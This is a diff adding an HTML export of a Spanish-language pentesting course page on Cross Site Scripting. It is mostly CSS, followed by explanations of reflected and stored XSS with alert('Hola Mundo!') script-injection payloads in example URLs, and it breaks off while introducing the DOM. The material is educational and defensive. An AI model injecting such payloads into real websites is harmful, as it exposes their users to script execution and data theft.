@@ -1,0 +1,745 @@
+<script>
+	document.addEventListener('DOMContentLoaded', function() {
+	var links = document.querySelectorAll('a');
+	for (var i = 0; i < links.length; i++) {
+	links[i].setAttribute('target', '_blank');
+	}
+		
+	const elementosConClaseImage = document.querySelectorAll('.image');
+	
+		// Recorre los elementos y quita la propiedad "href" de las etiquetas <a> dentro de ellos
+		elementosConClaseImage.forEach(elemento => {
+		const etiquetasA = elemento.querySelectorAll('a');
+		etiquetasA.forEach(etiqueta => {
+			etiqueta.removeAttribute('href');
+		});
+		});
+	});
+</script>
+<html oncontextmenu="return false"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Módulo 13 - Cross Site Scripting (XSS)</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+	user-select: none;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+	user-select: none;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+	user-select: all;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+	overflow: auto;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="25df4aae-cd77-4bde-a5bb-81971de3278f" class="page sans"><header><img class="page-cover-image" src="https://images.unsplash.com/photo-1553524913-efba3f0b533e?ixlib=rb-4.0.3&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><span class="icon">🤞🏻</span></div><h1 class="page-title">Módulo 13 - Cross Site Scripting (XSS)</h1><p class="page-description"></p></header><div class="page-body"><figure id="a71fbbcd-700b-4255-b048-d733f597d010" class="image" style="text-align:left"><a href="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Untitled.png"><img style="width:720px" src="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Untitled.png"/></a></figure><p id="382e873b-2dfc-47a4-8e89-0e34969041fa" class="">
+</p><p id="c7a9b659-0916-4397-93fe-9bb2601f3a34" class="">El Cross Site Scripting (XSS) es una vulnerabilidad común en aplicaciones web que permite a los atacantes inyectar código malicioso en una página web visitada por un usuario. En esta técnica, el pentester aprovecha los campos de entrada de información en un sitio web, como un campo de búsqueda o una sección de comentarios, para introducir código malicioso que se ejecutará en el navegador web del usuario. Esto puede permitir al atacante robar información confidencial, redirigir al usuario a otra página web falsa o incluso infectar su sistema con malware.</p><p id="5e78d25f-811d-49c1-86db-d68125c5ec5e" class="">
+</p><figure id="b3222a3a-6ef2-4959-958b-905b85a6e70f" class="image"><a href="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Concepto_XSS.png"><img style="width:626px" src="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Concepto_XSS.png"/></a><figcaption>Imagen: Taxonomia del Cross Site Scripting (XSS)</figcaption></figure><h1 id="05242c8e-d3d1-4596-9de6-07d7787055e2" class=""><strong>Mecánica del Ataque</strong></h1><p id="5be84063-3a3e-41f6-976a-e4106cbdb43e" class="">Para evaluar la existencia de vulnerabilidades XSS en una aplicación web, se pueden seguir los siguientes pasos:</p><p id="702dd38e-46ac-410b-aba0-d9b5ca5f814a" class="">
+</p><figure id="a94f5bea-cd07-4ccc-990c-93055dfff885" class="image"><a href="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Metodologia_de_Ataque_para_XSS.png"><img style="width:832px" src="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Metodologia_de_Ataque_para_XSS.png"/></a><figcaption>Imagen: Metodología de pruebas de Cross Site Scripting (XSS)</figcaption></figure><h1 id="64cc34fa-f930-4169-bcf1-77c535c798b1" class="">Tipos de XSS</h1><p id="781624ab-ebd5-4cf1-b56c-cb080e32f311" class="">A continuación, se presentan algunos ejemplos que ilustran diferentes tipos de ataques XSS:</p><h2 id="8e24e5a0-f01e-44b9-82fd-5d04f9763b8f" class=""><strong>Reflected XSS</strong></h2><p id="c8cacc89-5756-436c-a795-1f6550b5ef88" class="">Este tipo de ataque consiste en inyectar un código malicioso en un parámetro de la solicitud HTTP, que luego es procesado por la aplicación web y desplegado en el navegador del usuario sin validación ni codificación.</p><p id="a9c5854c-a2bf-406b-b7d0-450fea4e70af" class="">
+</p><figure id="358c52b5-d720-44b7-8856-dcadc90133e7" class="image"><a href="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Reflected_XSS.png"><img style="width:1056px" src="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Reflected_XSS.png"/></a><figcaption>Imagen: XSS Reflejado</figcaption></figure><p id="45e0f802-7246-422a-984c-77c478a5596e" class="">
+</p><p id="5c1d2062-afed-4e49-891c-01449e263e3d" class="">Supongamos que un sitio web tiene un campo de búsqueda donde los usuarios pueden buscar productos y la URL que se genera es: </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fa506ccc-d38e-4107-b861-088e5f0bec4b" class="code"><code class="language-JavaScript">https://www.ejemplo.com/buscar?consulta=</code></pre><p id="68f9bd8c-827a-47bb-b89e-ad9b6d0cf27e" class="">
+</p><p id="d952ed77-f8f8-4cba-aa6f-cc7b29a564b9" class="">Entonces, un atacante podría enviar un enlace a un usuario que contenga el siguiente script malicioso: </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fa3d7bb9-603c-4194-93f2-e6a806664427" class="code"><code class="language-JavaScript">&quot;&gt;&lt;script&gt;alert(&#x27;Hola Mundo!&#x27;)&lt;/script&gt; 
+
+que se vería de esta forma:
+
+https://www.ejemplo.com/buscar?consulta=%22%3E%3Cscript%3Ealert(&#x27;Hola%20Mundo!&#x27;)%3C/script%3E</code></pre><p id="10d743f7-e47d-462a-b421-a867ecdd08da" class="">
+</p><p id="d1b0e41a-5428-4a6e-925a-5a9d492d859f" class="">Cuando el usuario hace clic en el enlace y realiza la búsqueda, el script se ejecuta y se muestra la alerta &quot;Hola Mundo!&quot;. En este caso se ejecuta del lado de la Víctima.</p><p id="08be46d7-451c-4fc8-ac7a-883dfe2c8ffb" class="">
+</p><figure id="819ee8b8-7865-4886-8819-1b609b2d8379" class="image"><a href="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Untitled%201.png"><img style="width:693px" src="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Untitled%201.png"/></a><figcaption>Imagen: Ejecución de un XSS Reflejado</figcaption></figure><p id="8f351422-241c-4099-9387-46ec2b80a705" class="">
+</p><h2 id="1f22d15a-2da3-4e13-86d3-0858fcb154b1" class=""><strong>Stored XSS</strong></h2><p id="bb9e6275-9981-4db1-adbf-d1e82c25f6e1" class="">Este tipo de ataque consiste en almacenar un código malicioso en la base de datos de la aplicación web, que luego es mostrado a los usuarios que acceden al recurso vulnerable.</p><p id="dbc9dfc8-d5cf-4678-8f3e-300eaa4ad572" class="">
+</p><figure id="45979ed4-b910-4b54-943d-0ed6f3afcab3" class="image"><a href="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Stored_XSS.png"><img style="width:960px" src="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Stored_XSS.png"/></a><figcaption>Imagen: XSS Almacenado</figcaption></figure><p id="ebd56eff-bf63-4f89-a15e-0863b6769e3b" class="">
+</p><p id="9951c0e3-d084-4414-9f0d-76cf5d9ba760" class="">Imagina que en un sitio web de comentarios (como un blog), los usuarios pueden dejar comentarios en una publicación; (esos comentarios se almacenan en una base de datos). La URL que genera el sitio web es: </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="125c7fdf-0764-4d96-a786-6c97aa5aed9b" class="code"><code class="language-JavaScript">https://www.ejemplo.com/comentarios?id=12345&amp;comentario=</code></pre><p id="c1e291fa-d9ab-4ffb-b166-3688c31541be" class="">
+</p><p id="9599b86d-8df5-4ff7-88d3-2553927b2e27" class="">Un atacante podría enviar un comentario malicioso que contenga el siguiente script:</p><p id="524b99af-c616-4781-a13e-2b77fa67efc9" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="08c68f26-ddd6-4385-965b-148a91867617" class="code"><code class="language-JavaScript">https://www.ejemplo.com/comentarios?id=12345&amp;comentario= &lt;script&gt;alert(&#x27;Hola Mundo!&#x27;)&lt;/script&gt;</code></pre><p id="592fdf4c-c520-4e42-836b-94a5ac2ec736" class="">
+</p><p id="1c433bbd-e6ff-4e23-8c9c-f558a2a05ed3" class="">Cuando un usuario visite la publicación y cargue los comentarios, el script malicioso se ejecutará y mostrará la alerta &quot;Hola Mundo!&quot;. En este caso se ejecuta del lado del Servidor.</p><h2 id="54ed23e7-b6c3-4098-a6b6-9fe133d968d2" class=""><strong>DOM-based XSS</strong></h2><p id="fbc9e21d-be95-4424-9904-991c510e286a" class="">Primero, expliquemos que es DOM:</p><p id="dc748236-1913-4a80-90ee-f482cacdce60" class=""><strong>DOM: Document Object Model</strong></p><p id="43bc3398-8c09-4b3b-841f-8b261516b298" class="">El Document Object Model (DOM) es una representación en memoria de una página web que permite a los desarrolladores acceder y manipular el contenido de la página a través de JavaScript. El DOM es una estructura jerárquica (árbol) de nodos que representa todos los elementos de la página, como encabezados, párrafos, imágenes, formularios, etc.</p><p id="9b2e1910-7ec6-40f5-9cc5-8ba08e54189a" class="">El DOM es una parte esencial de cualquier aplicación web moderna, ya que permite a los desarrolladores crear interacciones dinámicas con el usuario sin necesidad de recargar la página. Por ejemplo, si un usuario hace clic en un botón en una página web, el código JavaScript puede utilizar el DOM para cambiar el contenido de la página sin necesidad de volver a cargarla.</p><p id="ec24c387-2435-4507-8a7a-2da041df832d" class="">Un ejemplo sencillo de cómo se utiliza el DOM en una página web sería el siguiente:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" 